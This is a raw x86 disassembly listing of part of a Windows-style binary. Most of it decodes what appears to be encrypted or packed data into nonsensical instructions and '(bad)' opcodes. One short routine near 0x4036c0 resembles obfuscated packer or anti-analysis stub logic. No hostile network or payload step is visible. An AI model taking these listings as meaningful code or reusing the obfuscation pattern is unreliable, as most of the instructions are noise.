  403172:	int3   
  403173:	and    eax,0x97d00d62
  403178:	push   ebp
  403179:	int3   
  40317a:	inc    ebx
  40317b:	xchg   esp,eax
  40317c:	cmp    edi,DWORD PTR [edx-0x3a]
  40317f:	addr16 mov esi,0x77c33ea3
  403185:	push   ds
  403186:	retf   0xe767
  403189:	sbb    bh,BYTE PTR [esi-0x66]
  40318c:	dec    esp
  40318d:	push   edx
  40318e:	int3   
  40318f:	sub    ah,bl
  403191:	retf   0xe622
  403194:	push   ebp
  403195:	inc    ecx
  403196:	cmc    
  403197:	in     eax,dx
  403198:	push   eax
  403199:	push   ss
  40319a:	or     ah,cl
  40319c:	int3   
  40319d:	mov    ch,0xa9
  40319f:	lds    ebp,FWORD PTR [edi]
  4031a1:	xor    BYTE PTR [ebx+0x1e],cl
  4031a4:	jno    0x403152
  4031a6:	add    DWORD PTR [ebp-0x6f02e3b8],esi
  4031ac:	call   0x9d10:0x49f2acfc
  4031b3:	or     BYTE PTR [eax],bl
  4031b5:	xchg   esp,eax
  4031b6:	pop    edx
  4031b7:	test   eax,0x62e80cd0
  4031bc:	lea    esi,[edi-0x3f]
  4031bf:	lods   al,BYTE PTR ds:[esi]
  4031c0:	imul   edi,ecx,0x52cf78b1
  4031c6:	xchg   esp,eax
  4031c7:	mov    DWORD PTR [ebx+eiz*1+0x5be7a727],ebp
  4031ce:	mov    bh,0x9f
  4031d0:	xchg   edi,eax
  4031d1:	sbb    bl,BYTE PTR [ebx-0x6afdd16e]
  4031d7:	dec    esi
  4031d8:	mov    bl,0xb3
  4031da:	sbb    DWORD PTR [eax],ebx
  4031dc:	and    DWORD PTR [ecx+0x46],edx
  4031df:	ds mov eax,0xbfb1cfd6
  4031e5:	(bad)  
  4031e6:	in     al,0x19
  4031e8:	jp     0x403201
  4031ea:	into   
  4031eb:	jp     0x403243
  4031ed:	cmc    
  4031ee:	cdq    
  4031ef:	sbb    BYTE PTR cs:[ebp+0x306f6765],ch
  4031f6:	jl     0x40325e
  4031f8:	dec    esp
  4031f9:	xchg   edx,eax
  4031fa:	push   ds
  4031fb:	outs   dx,DWORD PTR ds:[esi]
  4031fc:	sar    cl,cl
  4031fe:	iret   
  4031ff:	jmp    0x403255
  403201:	mov    edi,0x421172d9
  403206:	mov    ds:0x3871c0c1,eax
  40320b:	lea    edi,[edx+0x74]
  40320e:	sar    BYTE PTR [edx],cl
  403210:	js     0x403246
  403212:	push   ecx
  403213:	leave  
  403214:	in     al,dx
  403215:	mov    ?,eax
  403217:	lea    esi,[edx+0x6c]
  40321a:	and    al,0xfc
  40321c:	test   DWORD PTR [edx-0x680eeff1],edi
  403222:	or     eax,0x24d6d0ea
  403227:	cli    
  403228:	nop
  403229:	inc    esi
  40322a:	add    BYTE PTR [ebx-0x561c6e21],dh
  403230:	jmp    0x9daf:0xf95ef015
  403237:	push   ecx
  403238:	retf   
  403239:	cmp    BYTE PTR [esp+edx*8-0x21],bh
  40323d:	(bad)  
  40323e:	push   ds
  40323f:	add    DWORD PTR [ecx-0x2c553da5],ecx
  403245:	test   eax,0x7aa12911
  40324a:	aad    0x7e
  40324c:	mov    edi,DWORD PTR [ebx-0x3f]
  40324f:	xchg   edi,eax
  403250:	dec    ecx
  403251:	xchg   edx,eax
  403252:	mov    ebx,0x91089b4b
  403257:	or     eax,0x8b2551fa
  40325c:	pop    eax
  40325d:	daa    
  40325e:	shr    BYTE PTR [esi-0x37],cl
  403261:	int    0xc1
  403263:	(bad)  
  403264:	lods   al,BYTE PTR ds:[esi]
  403265:	push   edi
  403266:	fsubr  DWORD PTR [ebp-0x68]
  403269:	mov    dh,0xcd
  40326b:	mov    ebp,0x7a305814
  403270:	mov    dh,BYTE PTR [edi-0x77a0b4d1]
  403276:	pop    es
  403277:	dec    ecx
  403278:	adc    al,0xaa
  40327a:	add    al,0xb2
  40327c:	ins    BYTE PTR es:[edi],dx
  40327d:	add    WORD PTR [ebx],cx
  403280:	enter  0xd14a,0x62
  403284:	sub    al,0xcf
  403286:	scas   al,BYTE PTR es:[edi]
  403287:	mov    dl,0x83
  403289:	fild   DWORD PTR [esi]
  40328b:	or     ah,bh
  40328d:	adc    BYTE PTR [edx+eax*4+0x3a],ah
  403291:	pushf  
  403292:	test   eax,0xdad8958
  403297:	pop    ss
  403298:	dec    ecx
  403299:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40329a:	inc    esp
  40329b:	test   BYTE PTR [edx+edx*8],dl
  40329e:	mov    edx,0xdbb7c53a
  4032a3:	dec    eax
  4032a4:	inc    edx
  4032a5:	cmp    ebx,DWORD PTR [eax+0xc]
  4032a8:	out    dx,eax
  4032a9:	sbb    bh,al
  4032ab:	idiv   DWORD PTR [ebx+0x1f]
  4032ae:	adc    BYTE PTR [edx+0x6b03c016],dl
  4032b4:	arpl   WORD PTR [eax-0x62],di
  4032b7:	sub    DWORD PTR [ecx+0x7e8d7052],0x75
  4032be:	ret    0x6d8c
  4032c1:	les    ebx,FWORD PTR [ecx]
  4032c3:	push   esi
  4032c4:	mov    dl,0x34
  4032c6:	pop    edx
  4032c7:	mov    BYTE PTR [ecx+0x3e3fcb3],bh
  4032cd:	bound  edx,QWORD PTR [eax+0x45]
  4032d0:	dec    ecx
  4032d1:	scas   al,BYTE PTR es:[edi]
  4032d2:	imul   ecx,DWORD PTR [ebx],0x29d7b2ac
  4032d8:	test   BYTE PTR ds:0xa32b99ab,ch
  4032de:	xor    DWORD PTR [ebx+0x41],eax
  4032e1:	je     0x403302
  4032e3:	inc    esi
  4032e4:	and    BYTE PTR [esi],ch
  4032e6:	jns    0x403366
  4032e8:	or     DWORD PTR [ebp+0x54],0x6387f894
  4032ef:	push   cs
  4032f0:	jecxz  0x403354
  4032f2:	shl    DWORD PTR [edx+0x632d8c9a],cl
  4032f8:	iret   
  4032f9:	add    DWORD PTR [ecx-0x13],ecx
  4032fc:	(bad)
  403301:	push   es
  403302:	dec    eax
  403303:	xchg   edx,eax
  403304:	cdq    
  403305:	add    bl,BYTE PTR [ecx+0x46]
  403308:	icebp  
  403309:	mov    dh,0x9a
  40330b:	out    0x6,al
  40330d:	scas   al,BYTE PTR es:[edi]
  40330e:	jmp    0xa8269fbd
  403313:	sar    BYTE PTR [eax-0x76],0x2
  403317:	mov    ch,0x6e
  403319:	loop   0x40338a
  40331b:	test   al,0x26
  40331d:	mov    al,0x51
  40331f:	call   0x720:0xd3a49d26
  403326:	and    eax,0xe2445240
  40332b:	out    dx,al
  40332c:	das    
  40332d:	xchg   edi,eax
  40332e:	dec    edx
  40332f:	jo     0x4032c5
  403331:	(bad)  
  403333:	loop   0x40333b
  403335:	sbb    ebp,eax
  403337:	aad    0xdb
  403339:	imul   edx,DWORD PTR [eax+0x5d],0x368b4572
  403340:	dec    eax
  403341:	mov    ah,cl
  403343:	sbb    BYTE PTR [ebx+0x1ed0d069],0x47
  40334a:	jp     0x40332f
  40334c:	dec    ebp
  40334d:	jnp    0x4032fb
  40334f:	mov    al,0x4c
  403351:	icebp  
  403352:	retf   
  403353:	dec    edx
  403354:	sbb    bl,BYTE PTR [edi-0x2c]
  403357:	and    DWORD PTR [eax],esp
  403359:	mov    al,BYTE PTR [edx-0x6a]
  40335c:	inc    ebx
  40335d:	pop    edx
  40335e:	xlat   BYTE PTR ds:[ebx]
  40335f:	mov    ?,WORD PTR [edi]
  403361:	cli    
  403362:	cmp    edi,ebx
  403364:	ret    0xb7f6
  403367:	scas   al,BYTE PTR es:[edi]
  403368:	call   0x6270:0x6ea98894
  40336f:	adc    DWORD PTR [edx-0x52],edi
  403372:	or     DWORD PTR [ecx],ebp
  403374:	push   0x67
  403376:	push   edi
  403377:	das    
  403378:	mov    esi,DWORD PTR [esp+eiz*2-0x38]
  40337c:	push   esi
  40337d:	je     0x4033a3
  40337f:	inc    ecx
  403380:	aaa    
  403381:	popa   
  403382:	pop    ebp
  403383:	mov    DWORD PTR [eax-0x78],ebx
  403386:	(bad)  
  403387:	pop    eax
  403388:	popa   
  403389:	ds stos BYTE PTR es:[edi],al
  40338b:	xchg   esi,eax
  40338c:	xchg   ecx,eax
  40338d:	cmp    bh,BYTE PTR [ebp-0x5f]
  403390:	clc    
  403391:	nop
  403392:	push   edi
  403393:	rol    BYTE PTR [edi],0x3a
  403396:	fadd   QWORD PTR ds:0x8b75fff4
  40339c:	jne    0x4033a6
  40339e:	imul   edi,edx
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	fs pop esi
  4033bb:	out    dx,al
  4033bc:	sub    DWORD PTR [edx],edi
  4033be:	adc    al,0x70
  4033c0:	jo     0x403380
  4033c2:	jle    0x403434
  4033c4:	jo     0x403439
  4033c6:	rol    BYTE PTR [edi+0x57d65919],cl
  4033cc:	pop    esp
  4033cd:	inc    edi
  4033ce:	jp     0x40343a
  4033d0:	jmp    0x40344f
  4033d2:	div    BYTE PTR [edi]
  4033d4:	call   0x744bc5d1
  4033d9:	clc    
  4033da:	imul   esp,ecx,0x6429cdb3
  4033e0:	imul   BYTE PTR [edi]
  4033e2:	test   ecx,edi
  4033e4:	push   ebx
  4033e5:	int3   
  4033e6:	mov    eax,ds:0x6286c20c
  4033eb:	not    DWORD PTR [edi+0x3fd9ba06]
  4033f1:	jmp    0x4033a2
  4033f3:	ins    BYTE PTR es:[edi],dx
  4033f4:	adc    dl,ch
  4033f6:	fdiv   st(1),st
  4033f8:	mov    ds,edx
  4033fa:	cld    
  4033fb:	or     ebx,DWORD PTR [ebp-0x58a036d7]
  403401:	sbb    DWORD PTR [ecx+0x2dffa705],esi
  403407:	jecxz  0x40339f
  403409:	and    eax,esp
  40340b:	icebp  
  40340c:	xchg   ecx,eax
  40340d:	push   esp
  40340e:	je     0x4033bc
  403410:	loope  0x403457
  403412:	test   DWORD PTR [edx],ebx
  403414:	jge    0x4033b0
  403416:	cdq    
  403417:	mov    al,BYTE PTR [esi]
  403419:	mov    gs,WORD PTR [ebx]
  40341b:	(bad)  
  40341c:	retf   
  40341d:	mov    cl,0xd
  40341f:	xor    DWORD PTR [eax+0x4e86f939],edx
  403425:	out    0x3c,eax
  403427:	ja     0x4033d2
  403429:	jb     0x403452
  40342b:	inc    esi
  40342c:	sub    ecx,DWORD PTR [edi]
  40342e:	std    
  40342f:	jbe    0x4033c2
  403431:	adc    DWORD PTR [edi+0x45e3023a],edi
  403437:	bound  esp,QWORD PTR [edi-0x76]
  40343a:	in     eax,dx
  40343b:	jbe    0x403484
  40343d:	call   0x61d0:0x758a6cf7
  403444:	outs   dx,DWORD PTR ds:[esi]
  403445:	cmp    dh,BYTE PTR [ecx+0x654294fc]
  40344b:	xchg   esp,eax
  40344c:	ins    DWORD PTR es:[edi],dx
  40344d:	xor    ch,bh
  40344f:	mov    BYTE PTR [ebp+ebx*1-0x54532f7],0xbc
  403457:	leave  
  403458:	mov    eax,ds:0x939e74bc
  40345d:	popa   
  40345e:	shl    DWORD PTR [ecx+0x717a111],1
  403464:	daa    
  403465:	aaa    
  403466:	adc    eax,0xf074e6c5
  40346b:	je     0x403447
  40346d:	bound  esi,QWORD PTR [edi+ebx*1]
  403470:	mov    ah,0x9a
  403472:	dec    eax
  403473:	std    
  403474:	push   ds
  403475:	ret    
  403476:	jmp    0x7a62:0x2d939e60
  40347d:	pop    ebp
  40347e:	xor    al,0x49
  403480:	push   edx
  403481:	or     ebx,DWORD PTR [esi-0x34]
  403484:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403485:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403486:	cmc    
  403487:	scas   eax,DWORD PTR es:[edi]
  403488:	(bad)  
  403489:	xchg   esp,eax
  40348a:	inc    ebp
  40348b:	xchg   ebp,eax
  40348c:	shl    ebx,0x6e
  40348f:	hlt    
  403490:	mov    bl,BYTE PTR [esi]
  403492:	fist   DWORD PTR [ebp-0x4d]
  403495:	enter  0x7b66,0x2a
  403499:	adc    eax,0xe2cf3ab2
  40349e:	jae    0x4034eb
  4034a0:	and    al,0x63
  4034a2:	dec    ecx
  4034a3:	pop    esi
  4034a4:	and    al,0x9f
  4034a6:	push   0x49
  4034a8:	jne    0x4034b4
  4034aa:	out    dx,al
  4034ab:	mov    bh,BYTE PTR [edi-0x27]
  4034ae:	sahf   
  4034af:	xchg   esp,eax
  4034b0:	mov    esi,0x14235e
  4034b5:	or     al,0xc4
  4034b7:	adc    eax,0x270efc6f
  4034bc:	pop    ecx
  4034be:	mov    bh,0x68
  4034c0:	mov    ebp,0x5cae57ed
  4034c5:	cmp    al,0xa7
  4034c7:	cmc    
  4034c8:	test   esp,ebx
  4034ca:	out    dx,al
  4034cb:	lds    eax,FWORD PTR [edi-0xd]
  4034ce:	lea    ebp,[eax+0x384f3652]
  4034d4:	or     BYTE PTR [ecx+0x32],bl
  4034d7:	ret    0x852
  4034da:	xchg   edx,eax
  4034db:	and    dl,BYTE PTR [ebp+0x30]
  4034de:	pop    ds
  4034df:	add    al,0xa2
  4034e1:	jbe    0x4034d5
  4034e3:	int3   
  4034e4:	dec    ebx
  4034e5:	sti    
  4034e6:	pop    ds
  4034e7:	outs   dx,DWORD PTR ds:[esi]
  4034e8:	loope  0x40348f
  4034ea:	mov    al,0x5
  4034ec:	mov    BYTE PTR [edx-0x4d],dh
  4034ef:	adc    eax,0x1d24f8b2
  4034f4:	jl     0x40355a
  4034f6:	xchg   ecx,eax
  4034f7:	and    al,0xfe
  4034f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034fa:	and    eax,0xa39180a5
  4034ff:	sub    DWORD PTR [esi-0x2df008a],0xfffffff7
  403506:	dec    ebx
  403507:	dec    DWORD PTR [edi-0x122fc305]
  40350d:	movsx  esp,BYTE PTR [edx-0x3b5acd55]
  403514:	sub    BYTE PTR [esi],bl
  403516:	mov    bl,0x15
  403518:	sub    BYTE PTR [edx],cl
  40351a:	dec    edx
  40351b:	mov    cl,0xae
  40351d:	js     0x4034e6
  40351f:	mov    cl,0xe3
  403521:	sahf   
  403522:	fdivr  QWORD PTR [eax+0x45]
  403525:	sbb    BYTE PTR [edx+0x71a3250e],0x1d
  40352c:	push   ebp
  40352d:	mov    edx,DWORD PTR [ebx]
  40352f:	sahf   
  403530:	jecxz  0x40351e
  403532:	xchg   ebp,eax
  403533:	cmp    DWORD PTR [ebx],0x3a
  403536:	mov    edi,0x737567ce
  40353b:	or     ebx,DWORD PTR [ecx-0x5d253801]
  403541:	out    0x87,al
  403543:	mov    ebp,0x534dc735
  403548:	adc    eax,0xf3efdf29
  40354d:	shl    BYTE PTR [eax],1
  40354f:	push   esi
  403550:	out    dx,al
  403551:	scas   eax,DWORD PTR es:[edi]
  403552:	mov    DWORD PTR [ecx+0x159f654d],eax
  403558:	sub    ebx,DWORD PTR [esi+edx*1+0x5a]
  40355c:	add    dl,BYTE PTR [eax+0x7c0fd5fc]
  403562:	leave  
  403563:	mov    eax,ds:0xc810efd4
  403568:	int3   
  403569:	call   ebx
  40356b:	inc    eax
  40356c:	inc    ebx
  40356d:	inc    edi
  40356e:	test   BYTE PTR [eax+0x79],al
  403571:	aas    
  403572:	and    BYTE PTR [edi],ch
  403574:	repnz imul ecx,DWORD PTR ds:0x64bcd3a2,0x507c1a51
  40357f:	rol    edi,1
  403581:	(bad)  
  403582:	iret   
  403583:	pop    edx
  403584:	and    eax,0x7deeee75
  403589:	add    eax,0x2c3793ab
  40358e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40358f:	sbb    al,0x88
  403591:	test   eax,0xef08a182
  403596:	shl    BYTE PTR [esi],0x3d
  403599:	(bad)  
  40359a:	fcomp  QWORD PTR [esi-0x2574b725]
  4035a0:	pop    edx
  4035a1:	js     0x403576
  4035a3:	inc    esp
  4035a4:	pop    ds
  4035a5:	scas   al,BYTE PTR es:[edi]
  4035a6:	dec    eax
  4035a7:	bound  eax,QWORD PTR [edi+0x7e]
  4035aa:	sar    BYTE PTR [edx],0xe4
  4035ad:	call   0x2a0:0xbd68bdab
  4035b4:	xchg   edx,eax
  4035b5:	xchg   DWORD PTR [esi],edx
  4035b7:	inc    cl
  4035b9:	and    edx,esp
  4035bb:	adc    eax,0x562b4bc
  4035c0:	jmp    0x1b3a:0x28517655
  4035c7:	pop    edi
  4035c8:	iret   
  4035c9:	inc    ebp
  4035ca:	test   BYTE PTR [ecx],cl
  4035cc:	jg     0x4035c3
  4035ce:	sub    cl,cl
  4035d0:	pushf  
  4035d1:	cld    
  4035d2:	inc    esi
  4035d3:	mov    cs,WORD PTR [edx]
  4035d5:	sub    al,ah
  4035d7:	les    eax,FWORD PTR [ebp+eiz*8+0x49]
  4035db:	div    BYTE PTR [edi-0x34]
  4035de:	mov    dl,0x16
  4035e0:	iret   
  4035e1:	xor    DWORD PTR [ebx],0xffffff97
  4035e4:	mov    BYTE PTR [ebx],al
  4035e6:	in     al,dx
  4035e7:	jnp    0x40358b
  4035e9:	mov    edi,?
  4035eb:	ret    
  4035ec:	loopne 0x4035f7
  4035ee:	sbb    al,0x9f
  4035f0:	jp     0x403601
  4035f2:	sbb    cl,BYTE PTR [edx+ebx*4]
  4035f5:	nop
  4035f6:	enter  0xbede,0x36
  4035fa:	sti    
  4035fb:	gs pop edi
  4035fd:	cli    
  4035fe:	mov    ah,0xab
  403600:	mov    eax,ds:0x902c35b0
  403605:	in     al,dx
  403606:	repnz fwait
  403608:	dec    esp
  40360a:	jno    0x4035c9
  40360c:	dec    esi
  40360d:	(bad)  [edx-0x61163db0]
  403613:	inc    edi
  403614:	sbb    al,0xf4
  403616:	pop    ebx
  403617:	retf   
  403618:	jb     0x40364a
  40361a:	add    esi,esi
  40361c:	mov    WORD PTR [eax],es
  40361e:	add    DWORD PTR [edi-0x6f7afc82],0x8171e0dc
  403628:	add    cl,dl
  40362a:	add    eax,0x3e7dc076
  40362f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403630:	push   edi
  403631:	push   ecx
  403632:	cmp    BYTE PTR [edx+0x11],0x22
  403636:	ds into 
  403638:	jns    0x4036a8
  40363a:	pusha  
  40363b:	sub    dl,dh
  40363d:	xchg   DWORD PTR [ebx],ebx
  40363f:	ror    ebp,cl
  403641:	adc    ecx,DWORD PTR [ecx-0x7d]
  403644:	test   eax,0x73c7e15a
  403649:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40364a:	ret    0xb604
  40364d:	ins    BYTE PTR es:[edi],dx
  40364e:	add    eax,0x4bc43399
  403653:	xchg   DWORD PTR [ebx],ebx
  403655:	mov    bh,0x59
  403657:	(bad)  
  403658:	shr    BYTE PTR [ebp+0x2c825404],1
  40365e:	iret   
  40365f:	fwait
  403660:	and    dh,BYTE PTR [ecx+0x7c]
  403663:	lahf   
  403664:	and    al,0xe2
  403666:	shl    BYTE PTR [ecx],cl
  403668:	fwait
  403669:	jle    0x4036b2
  40366b:	fidiv  DWORD PTR [ecx+0x25]
  40366e:	lods   eax,DWORD PTR ds:[esi]
  40366f:	mov    ch,0x2e
  403671:	popf   
  403672:	mov    ds:0x4ddad46c,eax
  403677:	aam    0xf4
  403679:	rcl    BYTE PTR [edx],cl
  40367b:	iret   
  40367c:	push   edi
  40367d:	mov    BYTE PTR [edx],cl
  40367f:	repnz fmul DWORD PTR [ebx+0x1a]
  403683:	loop   0x40361f
  403685:	sub    BYTE PTR [edx-0x76],bl
  403688:	test   BYTE PTR [ebx],al
  40368a:	pushf  
  40368b:	jb     0x4036bf
  40368d:	add    BYTE PTR [eax+0x458b3704],cl
  403693:	cld    
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fd6d,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fd6d,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fd6d,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e357
  4036fc:	cmp    DWORD PTR ds:0x42fd6d,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fd6d
  403711:	dec    eax
  403712:	mov    ds:0x42fd6d,eax
  403717:	mov    eax,ds:0x42fd6d
  40371c:	dec    eax
  40371d:	mov    ds:0x42fd6d,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e773,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e777,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fd8d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e793,0x42e19c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fdfa,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e1a4,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e78f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    DWORD PTR [ebx+0x5],ebx
  4037a3:	fucomip st,st(6)
  4037a5:	js     0x4037b8
  4037a7:	jo     0x403819
  4037a9:	cmp    eax,0xd70707d
  4037ae:	adc    esp,esi
  4037b0:	mov    cl,0x66
  4037b2:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4037b4:	out    dx,al
  4037b5:	or     eax,0xae4775a3
  4037ba:	xor    ch,cl
  4037bc:	mul    ah
  4037be:	adc    eax,0xda156fe1
  4037c3:	mov    BYTE PTR gs:[edi+0x2f],bl
  4037c7:	push   0x1bc9436a
  4037cc:	imul   edi,DWORD PTR [eax+0x29d23e25],0x19
  4037d3:	add    dh,BYTE PTR [edi]
  4037d5:	popa   
  4037d6:	fld    DWORD PTR [ecx-0x475920b3]
  4037dc:	fist   DWORD PTR [edi]
  4037de:	and    al,0xbd
  4037e0:	push   ebp
  4037e1:	xchg   edx,eax
  4037e2:	bound  edi,QWORD PTR [ecx+0x79]
  4037e5:	(bad)  
  4037e6:	sub    esi,ebx
  4037e8:	mov    eax,0x4bdcb615
  4037ed:	aaa    
  4037ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037ef:	adc    al,0x89
  4037f1:	jnp    0x403774
  4037f3:	mov    edx,ecx
  4037f5:	and    cl,0x56
  4037f8:	mov    dl,0x9d
  4037fa:	or     ecx,edx
  4037fc:	popa   
  4037fd:	mov    esi,0xf665e908
  403802:	adc    al,0xf4
  403804:	lods   eax,DWORD PTR ds:[esi]
  403805:	or     ch,bl
  403807:	mov    dl,0x20
  403809:	pop    esp
  40380a:	adc    cl,BYTE PTR [ecx-0x3d85cd41]
  403810:	lds    ebx,FWORD PTR [ecx]
  403812:	pushf  
  403813:	scas   eax,DWORD PTR es:[edi]
  403814:	inc    esi
  403815:	xchg   edx,eax
  403816:	out    0xfa,eax
  403818:	sub    BYTE PTR [eax],cl
  40381a:	ins    DWORD PTR es:[edi],dx
  40381b:	jmp    0xd54c:0xbcab251c
  403822:	add    DWORD PTR es:[eax-0x63],ebx
  403826:	dec    ecx
  403827:	mov    edi,0xde6f2a89
  40382c:	add    eax,0xe62a87d8
  403831:	fldcw  WORD PTR [esp+ebp*4-0x4c0d4468]
  403838:	pushf  
  403839:	pop    edi
  40383a:	jns    0x4038b6
  40383c:	call   DWORD PTR [ebx+0x25c24aaa]
  403842:	mov    dh,0x77
  403845:	push   es
  403846:	fmul   DWORD PTR [edx-0x36]
  403849:	in     eax,dx
  40384a:	xor    DWORD PTR [ebx+edx*8-0x2c],edi
  40384e:	mov    esp,0x92fb2419
  403853:	nop
  403854:	outs   dx,DWORD PTR ds:[esi]
  403855:	sbb    al,dl
  403857:	mov    ah,0xc5
  403859:	push   0x17
  40385b:	(bad)  
  40385d:	cmp    DWORD PTR [ecx+0x2e94abbd],0xffffffb7
  403864:	aad    0xa4
  403866:	jns    0x40387d
  403868:	pop    esi
  403869:	mov    ebx,0x4bb856e7
  40386e:	jae    0x4038cc
  403870:	sbb    ebx,DWORD PTR [esi-0x73e949bc]
  403876:	and    al,0xd7
  403878:	call   0x64b7ddc5
  40387d:	add    al,0x5a
  40387f:	inc    eax
  403880:	dec    edx
  403881:	adc    DWORD PTR [edx+0x17],eax
  403884:	popf   
  403885:	mov    dl,0x30
  403887:	in     al,dx
  403888:	mov    ch,0x6b
  40388a:	mov    esp,DWORD PTR [edx]
  40388c:	lds    edi,FWORD PTR [edi+edi*2+0x272e25b3]
  403893:	cmp    ebx,DWORD PTR [eax]
  403895:	cmp    DWORD PTR [edx+0x34dca181],ebx
  40389b:	mov    esi,ecx
  40389d:	adc    al,0x71
  40389f:	out    0x41,eax
  4038a1:	add    ch,al
  4038a3:	xchg   ebx,eax
  4038a4:	mov    edi,DWORD PTR [edx-0x28601402]
  4038aa:	jbe    0x40391a
  4038ac:	pop    eax
  4038ad:	enter  0xac06,0x56
  4038b1:	sub    edx,ecx
  4038b3:	push   eax
  4038b4:	pop    edi
  4038b5:	loope  0x4038ec
  4038b7:	neg    dh
  4038b9:	clc    
  4038ba:	pop    eax
  4038bb:	fimul  WORD PTR gs:[esi-0x10]
  4038bf:	and    ebp,DWORD PTR [edi+ebp*1+0x2c64ee6d]
  4038c6:	fldcw  WORD PTR [eax+0x36]
  4038c9:	adc    BYTE PTR [ebx+0x25],bl
  4038cc:	jmp    0x6ab5:0x6c77c390
  4038d3:	rol    DWORD PTR [edi],1
  4038d5:	(bad)  
  4038d6:	jae    0x4038b4
  4038d8:	push   ss
  4038d9:	xor    edi,DWORD PTR [ebx]
  4038db:	jle    0x40387a
  4038dd:	ss or  esp,0xc71ce8ad
  4038e4:	pop    ecx
  4038e5:	popa   
  4038e6:	loopne 0x4038fa
  4038e8:	out    dx,eax
  4038e9:	pop    es
  4038ea:	pop    ebp
  4038eb:	inc    esi
  4038ec:	mov    bl,0x9
  4038ee:	not    DWORD PTR [edi-0x3e1dfe80]
  4038f4:	icebp  
  4038f5:	jae    0x403883
  4038f7:	push   ebx
  4038f8:	test   al,0xc
  4038fa:	add    ch,BYTE PTR [esi+eiz*1-0x75]
  4038fe:	call   0x5e30fc8e
  403903:	test   cl,0xa6
  403906:	mov    ch,0x64
  403908:	mov    esp,0x41e32d44
  40390d:	sub    eax,0xc11d9c4b
  403912:	add    ch,BYTE PTR ds:0x3f0b509a
  403918:	dec    ecx
  403919:	mov    ch,0xb1
  40391b:	mov    bh,0xa2
  40391d:	aad    0xfc
  40391f:	sbb    dh,bl
  403921:	or     BYTE PTR [edx-0x6e],ch
  403924:	test   al,0xfc
  403926:	out    0x34,eax
  403928:	dec    esi
  403929:	call   0x35e9ded
  40392e:	(bad)  
  40392f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403930:	scas   al,BYTE PTR es:[edi]
  403931:	dec    ecx
  403932:	into   
  403933:	int    0x60
  403935:	out    0x3c,al
  403937:	rcl    BYTE PTR [edx+0x7f],cl
  40393a:	push   ds
  40393b:	jp     0x40390a
  40393d:	cmp    BYTE PTR [edx+0x2b810db7],0xa3
  403944:	inc    edx
  403945:	sub    ebx,ecx
  403947:	ss xor edi,0xfffffff6
  40394b:	test   al,0x8d
  40394d:	sbb    esi,esi
  40394f:	mov    eax,ds:0x8894aa9b
  403954:	fadd   st(5),st
  403956:	retf   0x754c
  403959:	jae    0x403939
  40395b:	mov    bh,0x88
  40395d:	cs jp  0x403926
  403960:	dec    esp
  403961:	rol    DWORD PTR [edx],cl
  403963:	xor    esp,ebx
  403965:	or     dl,BYTE PTR [edi]
  403967:	int3   
  403968:	lods   al,BYTE PTR ds:[esi]
  403969:	hlt    
  40396a:	cwde   
  40396b:	mov    DWORD PTR ds:0x4602853c,0x2a7feea0
  403975:	jbe    0x40398a
  403977:	je     0x403983
  403979:	rcl    DWORD PTR [edi],1
  40397b:	push   0x12
  40397d:	adc    al,0x24
  40397f:	aam    0x30
  403981:	jecxz  0x4039b0
  403983:	cmp    eax,0xd7cd279f
  403988:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403989:	pop    esi
  40398a:	adc    cl,BYTE PTR [edx-0x7a]
  40398d:	sub    esi,esi
  40398f:	inc    ecx
  403990:	jle    0x40399d
